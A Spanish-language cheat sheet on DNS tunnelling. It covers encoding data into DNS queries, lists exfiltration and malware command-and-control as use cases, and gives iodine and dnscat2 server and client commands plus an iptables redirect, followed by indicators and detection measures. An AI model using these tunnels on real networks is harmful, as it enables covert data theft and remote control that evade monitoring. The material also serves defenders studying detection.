**Cheat Sheet: Tunelización DNS**

---

### Concepto

La tunelización DNS permite encapsular datos dentro de solicitudes/respuestas DNS para evadir restricciones de red. 
Es útil cuando solo se permite tráfico DNS (puerto 53 UDP/TCP), como en redes corporativas o entornos restringidos.

### Flujo General

1. Cliente en red restringida genera datos o comandos (shell, archivos, etc.).
2. Estos datos se codifican (base32/base64) y se insertan en peticiones DNS.
3. Se envían al servidor DNS bajo tu control.
4. El servidor extrae, responde o reenvía los datos al backend.

### Casos de Uso

* Exfiltración de datos en ambientes monitoreados.
* Acceso remoto a redes restringidas.
* Persistencia y comunicación con malware.

### Herramientas Populares

* `iodine` (tunelización IP sobre DNS)
* `dnscat2` (canal C2 tipo chat sobre DNS)
* `Heyoka` (herramienta para covert channels, incluido DNS)
* `dns2tcp`

### Requisitos

* Acceso saliente al puerto 53 (UDP preferido, TCP en fallback).
* Control sobre un dominio propio (ej. `tunel.mi-c2.com`).
* Un servidor DNS que responda peticiones y actúe como relay.

### Ejemplos

#### Con `iodine`

**Servidor (afuera):**

```bash
iodined -f -P clave 10.0.0.1 tunel.dominio.com
```

**Cliente (desde red restringida):**

```bash
iodine -P clave tunel.dominio.com
```

Esto crea un túnel IP que permite tráfico como si fuera una VPN.

#### Con `dnscat2`

**Servidor (afuera):**

```bash
ruby ./dnscat2.rb
```

**Cliente:**

```bash
dnscat --dns server=8.8.8.8 --secret=clave
```

### Comandos Útiles

* Ver tráfico DNS en red:

```bash
tcpdump -ni eth0 port 53
```

* Reenviar peticiones DNS al servidor propio:

```bash
iptables -t nat -A OUTPUT -p udp --dport 53 -j DNAT --to <IP-servidor>
```

### Indicadores de Actividad

* Peticiones DNS frecuentes a dominios poco comunes.
* Subdominios largos y con base64/base32.
* Tráfico DNS sostenido sin justificación.

### Prevención y Detección

* DPI con decodificación de payload DNS.
* Análisis de comportamiento en logs DNS.
* Limitar DNS saliente solo a resolvers autorizados.


